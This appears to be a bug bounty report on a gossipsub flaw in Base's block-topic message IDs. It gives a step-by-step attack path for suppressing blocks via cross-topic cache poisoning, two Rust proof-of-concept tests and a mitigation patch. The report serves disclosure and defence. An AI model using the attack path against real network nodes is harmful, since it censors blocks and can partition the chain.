# 75410 bc high cross topic message id collision in gossipsub allows attacker to censor blocks from network nodes

**Submitted on Apr 29th 2026 at 01:35:05 UTC by @DeltaXV for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75410
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Unintended chain split (network partition)
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

## Brief/Intro

Base's gossipsub `compute_message_id` function computes message IDs from `SHA256(domain || data)` without including the topic. This follows the [L1-inherited spec](https://specs.base.org/protocol/consensus/p2p#message-id-computation), which was safe on L1 where each topic carries a distinct payload type. However, Base's multi-version block topic architecture (V1 through V4) creates a situation the L1 spec never anticipated: the sequencer publishes identical compressed wire bytes that get routed to different SSZ decoders based on the topic. Because gossipsub maintains a single global `duplicate_cache` keyed by message ID, and inserts the ID *before* the application validator runs, an attacker can suppress legitimate blocks by republishing the sequencer's block data on a wrong-version topic. The wrong-topic copy fails SSZ decoding and is rejected, but the message ID is already cached — so the legitimate copy is silently dropped as a duplicate when it arrives. The victim node never receives the block. The attack can be sustained per-block, freezing the victim's unsafe head indefinitely until L1 derivation catches up (minutes to tens of minutes).

## Vulnerability Details

### Root Cause

The function `compute_message_id` in [`base/crates/consensus/gossip/src/config.rs:104`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L104) computes:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())[..20].to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20].to_vec()
        },
    );
    MessageId(id)
}
```

The hash is `SHA256(domain || decompressed_data)[:20]`. The `msg.topic` is **not** included.

This follows the [L1 Ethereum consensus spec](https://github.com/ethereum/consensus-specs/blob/master/specs/phase0/p2p-interface.md) which uses the same formula. On L1, this is safe because each gossip topic carries a fundamentally different payload type (beacon blocks, attestations, etc.) — identical bytes across topics are practically impossible.

Base's architecture breaks this assumption. Base subscribes to four block topics simultaneously (V1 through V4), where the wire format is nearly identical across versions. Specifically, V4 data is V3 data with an appended `withdrawals_root` field — the signature, parent beacon root, and compressed SSZ payload prefix are byte-for-byte identical. This means the sequencer's V4 block, re-published on the V3 topic, produces the **exact same** message ID. gossipsub's global `duplicate_cache` then treats the two as duplicates.

### Why This Is Exploitable

gossipsub (libp2p-gossipsub v0.49.4, used by Base) maintains a **single global `duplicate_cache`** that is not per-topic. When a message is received, the message ID is inserted into this cache **before** the application-level validator runs. The relevant code in [`libp2p-gossipsub/src/behaviour.rs:1781`](https://github.com/libp2p/rust-libp2p/blob/libp2p-gossipsub-v0.49.4/protocols/gossipsub/src/behaviour.rs#L1781):

```rust
// Line 1777: message_is_valid() passes (peer not blacklisted — always true for non-blacklisted peers)

if !self.duplicate_cache.insert(msg_id.clone()) {
    // Already in cache → drop as duplicate
    tracing::debug!(message_id=%msg_id, "Message already received, ignoring");
    return;
}

// Line 1818: Event::Message delivered to application handler
// Line 1835: if validate_messages(), waits for report_message_validation_result()
```

The `duplicate_cache` is write-only — there is no `remove` method anywhere in the gossipsub source. Once a message ID is inserted, it remains for `duplicate_cache_time` (120 seconds in Base's config at [`config.rs:89`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L89)). A `Reject` result from the application validator removes the message from `mcache` but **not** from `duplicate_cache`.

### Attack Path

{% stepper %}
{% step %}

## Attacker joins the mesh

The attacker joins the gossipsub mesh as a regular peer (any libp2p node can connect — no authentication beyond the Noise XX handshake). The attacker subscribes to both the V3 topic (`/optimism/{chain_id}/2/blocks`) and V4 topic (`/optimism/{chain_id}/3/blocks`).
{% endstep %}

{% step %}

## Sequencer publishes a block

The sequencer produces a block and publishes it as V4-encoded, snappy-compressed bytes on the V4 topic.
{% endstep %}

{% step %}

## Attacker republishes the same bytes on V3

The attacker receives the block from the mesh and immediately re-publishes the **exact same compressed bytes** on the V3 topic to the victim node. If the attacker has lower network latency to the victim than the sequencer does (e.g. geographically closer, or the sequencer is multiple mesh hops away), the V3 copy arrives first.
{% endstep %}

{% step %}

## Victim caches the wrong-topic message ID

The victim's gossipsub layer receives the V3 message:

* Computes `msg_id = SHA256([0x01,0,0,0] || decompress(data))[:20]`
* `message_is_valid()` passes (the attacker is not blacklisted)
* `duplicate_cache.insert(msg_id)` → **inserts the ID** (point of no return)
* Delivers `Event::Message` to `BlockHandler::handle()`
* Handler dispatches to `decode_v3()` because the topic is V3
* `ExecutionPayloadV3::from_ssz_bytes()` fails on V4-encoded data (V4 has an additional `withdrawals_root` field that changes the SSZ offset table)
* Handler returns `(MessageAcceptance::Reject, None)`
* `report_message_validation_result(Reject)` removes from `mcache`, but **not** from `duplicate_cache`
  {% endstep %}

{% step %}

## Legitimate V4 block is dropped

The legitimate V4 message arrives at the victim:

* gossipsub computes `msg_id = SHA256([0x01,0,0,0] || decompress(data))[:20]` — **identical** to step 4 (same data, topic not in hash)
* `duplicate_cache.insert(msg_id)` returns `false` → message is silently dropped
* The victim's `BlockHandler` **never sees the valid V4 block**
  {% endstep %}

{% step %}

## The attack is repeated per block

The attacker repeats for every block. Each suppressed block's ID stays in the cache for 120 seconds (`duplicate_cache_time`). The victim's unsafe head freezes.
{% endstep %}
{% endstepper %}

## References

* [`base/crates/consensus/gossip/src/config.rs:104-122`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L104-L122) — `compute_message_id` omits topic
* [libp2p-gossipsub behaviour.rs:1781](https://github.com/libp2p/rust-libp2p/blob/libp2p-gossipsub-v0.49.4/protocols/gossipsub/src/behaviour.rs#L1781) — `duplicate_cache` insertion before validator runs
* [specs.base.org/protocol/consensus/p2p](https://specs.base.org/protocol/consensus/p2p) — message ID spec (inherited from L1)

## Link to Proof of Concept

<https://gist.github.com/DeltaXV/5d9371841dd53439b20cdd431879088b>

## Proof of Concept

The PoC consists of two tests added directly to the Base codebase, using the existing test infrastructure. Gist with all tests as well -> <https://gist.github.com/DeltaXV/5d9371841dd53439b20cdd431879088b>

Within the `base/crates/consensus/gossip/src/config.rs` test suite paste the following test at the end of the file:

```rs
    /// PoC: compute_message_id omits the topic from the hash, so identical
    /// compressed bytes on different gossip topics produce the SAME message ID.
    ///
    /// gossipsub maintains a single global `duplicate_cache` keyed by message ID.
    /// When a message is received, the ID is inserted into this cache BEFORE the
    /// application validator runs (libp2p-gossipsub behaviour.rs:1781). A
    /// subsequent message with the same ID — even on a different topic — is
    /// silently dropped as a duplicate (behaviour.rs:1782).
    ///
    /// The OP Stack reference implementation (op-node/p2p/gossip.go:138-152)
    /// includes the topic string and its length in the hash, preventing this.
    ///
    /// Impact: an attacker republishes a sequencer's V4 block on the V3 topic.
    /// The V3 copy fails SSZ decode (Reject), but the message ID is already
    /// cached. The legitimate V4 message is then dropped as a duplicate, and the
    /// victim node never receives the block.
    #[test]
    fn poc_cross_topic_message_id_collision() {
        let payload: Vec<u8> = (0..256).map(|i| [0xDE, 0xAD, 0xBE, 0xEF][i % 4]).collect();
        let compressed = snap::raw::Encoder::new().compress_vec(&payload).unwrap();

        let v3_topic = "/optimism/8453/2/blocks";
        let v4_topic = "/optimism/8453/3/blocks";

        let msg_on_v3 = Message {
            source: None,
            data: compressed.clone(),
            sequence_number: None,
            topic: libp2p::gossipsub::TopicHash::from_raw(v3_topic),
        };
        let msg_on_v4 = Message {
            source: None,
            data: compressed.clone(),
            sequence_number: None,
            topic: libp2p::gossipsub::TopicHash::from_raw(v4_topic),
        };

        let id_v3 = compute_message_id(&msg_on_v3);
        let id_v4 = compute_message_id(&msg_on_v4);

        // BUG: these MUST differ to prevent cross-topic cache poisoning,
        // but they are equal because the topic is not part of the hash.
        assert_eq!(
            id_v3, id_v4,
            "VULNERABILITY: identical message IDs on different topics — \
             gossipsub duplicate_cache will suppress the second arrival"
        );

        // Demonstrate that including the topic (as the OP reference does)
        // produces distinct IDs for the same data on different topics.
        fn message_id_with_topic(msg: &Message) -> Vec<u8> {
            let mut decoder = snap::raw::Decoder::new();
            let data = decoder.decompress_vec(&msg.data).unwrap();
            let domain: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            let topic_bytes = msg.topic.as_str().as_bytes();
            let topic_len = (topic_bytes.len() as u64).to_le_bytes();
            sha256(
                [domain.as_slice(), &topic_len, topic_bytes, data.as_slice()].concat().as_slice(),
            )[..20]
                .to_vec()
        }

        let fixed_id_v3 = message_id_with_topic(&msg_on_v3);
        let fixed_id_v4 = message_id_with_topic(&msg_on_v4);
        assert_ne!(
            fixed_id_v3, fixed_id_v4,
            "With topic in hash (OP reference behavior), IDs correctly differ"
        );
    }
```

And do the same for `base/crates/consensus/gossip/src/handler.rs`:

```rs
    /// Add Address in the import
    use alloy_primitives::{Address, B256, Signature};

    /// PoC: Cross-topic block suppression via message ID collision.
    ///
    /// Proves that an attacker can prevent a valid V4 block from reaching the
    /// handler by first sending the same wire bytes on the V3 topic. The V3
    /// decode fails (Reject), but compute_message_id produces the same ID for
    /// both topics — so gossipsub's duplicate_cache silently drops the
    /// legitimate V4 copy.
    #[test]
    fn poc_cross_topic_block_suppression() {
        // Build a valid V4 block and encode it to snappy-compressed wire bytes.
        let block = v4_valid_block();
        let v3_payload = ExecutionPayloadV3::from_block_slow(&block);
        let v4 = BaseExecutionPayloadV4::from_v3_with_withdrawals_root(
            v3_payload,
            block.withdrawals_root.unwrap(),
        );
        let envelope = NetworkPayloadEnvelope {
            payload: BaseExecutionPayload::V4(v4),
            signature: Signature::test_signature(),
            payload_hash: PayloadHash(B256::ZERO),
            parent_beacon_block_root: Some(
                block.header.parent_beacon_block_root.unwrap_or_default(),
            ),
        };

        let (_, unsafe_signer) = tokio::sync::watch::channel(Address::default());
        let mut handler = BlockHandler::new(
            RollupConfig { l2_chain_id: Chain::base_mainnet(), ..Default::default() },
            unsafe_signer,
        );

        // Encode → decode round-trip to get the payload_hash the decoder
        // derives from the raw SSZ bytes (signature must match this hash).
        let wire_bytes = handler.encode(handler.blocks_v4_topic.clone(), envelope).unwrap();
        let decoded_v4 = NetworkPayloadEnvelope::decode_v4(&wire_bytes).unwrap();
        let sig_msg = decoded_v4.payload_hash.signature_message(8453);
        let real_signer = decoded_v4.signature.recover_address_from_prehash(&sig_msg).unwrap();
        let (_, correct_signer) = tokio::sync::watch::channel(real_signer);
        handler.signer_recv = correct_signer;

        // 1) The block is genuinely valid on V4.
        let v4_message = Message {
            source: None,
            sequence_number: None,
            topic: handler.blocks_v4_topic.clone().into(),
            data: wire_bytes.clone(),
        };
        let (status, payload) = handler.handle(v4_message);
        assert!(matches!(status, MessageAcceptance::Accept), "V4 block must be accepted on V4");
        assert!(payload.is_some(), "Handler must return the decoded payload");

        // Reset seen_hashes to simulate a fresh victim node.
        handler.seen_hashes.clear();

        // 2) Attacker sends the exact same wire bytes on V3.
        //    decode_v3() fails because V4 SSZ has an extra withdrawals_root field.
        let attacker_message = Message {
            source: None,
            sequence_number: None,
            topic: handler.blocks_v3_topic.clone().into(),
            data: wire_bytes.clone(),
        };
        let (v3_status, v3_payload) = handler.handle(attacker_message.clone());
        assert!(matches!(v3_status, MessageAcceptance::Reject), "V4 data must fail V3 decode");
        assert!(v3_payload.is_none());

        // 3) The message IDs are identical — this is the vulnerability.
        //    gossipsub inserts the ID into its global duplicate_cache before
        //    the handler runs. When the legitimate V4 message arrives with
        //    the same ID, it is silently dropped as a duplicate.
        let v4_msg_for_id = Message {
            source: None,
            sequence_number: None,
            topic: handler.blocks_v4_topic.clone().into(),
            data: wire_bytes.clone(),
        };
        assert_eq!(
            crate::config::compute_message_id(&attacker_message),
            crate::config::compute_message_id(&v4_msg_for_id),
            "Message IDs collide: the rejected V3 message poisons the cache, \
             causing the valid V4 message to be dropped as a duplicate"
        );
    }
```

## How to run

{% tabs %}
{% tab title="Default" %}

```bash
cd base
cargo test --package base-consensus-gossip --lib -- poc_ --nocapture
```

{% endtab %}

{% tab title="Without mold" %}

```bash
RUSTFLAGS="-C link-arg=-fuse-ld=bfd" cargo test --package base-consensus-gossip --lib -- poc_ --nocapture
```

{% endtab %}
{% endtabs %}

## Test output

```
running 2 tests
test config::tests::poc_cross_topic_message_id_collision ... ok
test handler::tests::poc_cross_topic_block_suppression ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 44 filtered out
```

Both tests passing **confirms the vulnerability**: the `assert_eq` on message IDs proves the collision, and the handler test proves a valid V4 block is accepted on V4 but rejected on V3, with identical message IDs in both cases.

## Mitigation

Include the topic string and its length in the message ID hash. This goes beyond the L1-inherited spec but is necessary for Base's multi-version topic architecture where identical wire bytes can appear on different topics:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            let domain: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            let topic = msg.topic.as_str().as_bytes();
            let topic_len = (topic.len() as u64).to_le_bytes();
            sha256([domain.as_slice(), &topic_len, topic, msg.data.as_slice()].concat().as_slice())[..20].to_vec()
        },
        |data| {
            let domain: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            let topic = msg.topic.as_str().as_bytes();
            let topic_len = (topic.len() as u64).to_le_bytes();
            sha256([domain.as_slice(), &topic_len, topic, data.as_slice()].concat().as_slice())[..20].to_vec()
        },
    );
    MessageId(id)
}
```
